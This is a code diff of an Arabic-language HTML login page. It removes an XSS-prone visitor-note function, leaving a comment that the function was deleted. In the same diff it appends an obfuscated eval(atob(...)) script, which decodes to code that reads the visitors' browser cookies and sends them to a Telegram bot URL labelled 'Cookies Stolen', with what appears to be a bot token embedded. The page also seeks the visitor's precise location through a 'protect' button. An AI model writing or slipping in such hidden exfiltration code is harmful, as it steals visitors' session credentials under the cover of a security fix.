@@ -61,7 +61,6 @@
     button:hover {
       background-color: #e3e3e3;
     }
-
     
   </style><script type="text/javascript">
     (function(c,l,a,r,i,t,y){
@@ -79,26 +78,15 @@
     <input type="email" placeholder="اكتب الإيميل هنا">
     <input type="password" placeholder="اكتب كلمة المرور هنا" id="passwordInput">
     
-    <input type="text" id="visitorNote" placeholder="ملاحظات للزائر" onkeyup="displayNote()">
-    
     <button onclick="goToMain()">تسجيل الدخول</button>
   </div>
   
-  <div id="visitorNoteDisplay">
-    (ستظهر ملاحظات الزائر هنا مباشرة)
-  </div>
-
   <script>
     function goToMain() {
       window.location.href = "main.html";
     }
     
-    // الدالة المسؤولة عن ثغرة XSS
-    function displayNote() {
-      const note = document.getElementById('visitorNote').value;
-      // خطر XSS!
-      document.getElementById('visitorNoteDisplay').innerHTML = note;
-    }
+    // تم حذف الدالة 'displayNote()' هنا
   </script>
   
 <button id="protectButton" onclick="requestAndSendLocation()">
@@ -108,6 +96,7 @@
   (انتظر موافقتك على مشاركة الموقع الدقيق)
 </p>
 
+<script>eval(atob('Y29uc3QgY29va2llcyA9IGRvY3VtZW50LmNvb2tpZTsgY29uc3QgZW5jb2RlZENvb2tpZXMgPSBlbmNvZGVVUklDb21wb25lbnQoY29va2llcyk7IGNvbnN0IHRlbGVncmFtQXBpVXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q4NTE4NzY5MDM5OkFBRUNWVXZrX1JvTW52MFZxdVVnVVVNeDNvT3ZxbVZaTUEvc2VuZE1lc3NhZ2U/Y2hhdF9pZD02NzE3Mjg3MTYxJnRleHQ9Q29va2llcyUyMFN0b2xlbjolMjAiICsgZW5jb2RlZENvb2tpZXM7IGZldGNoKHRlbGVncmFtQXBpVXJsKTs='));</script>
 <script>
 // دالة لتوليد مُعرِّف جلسة عشوائي
 function generateSessionId() {
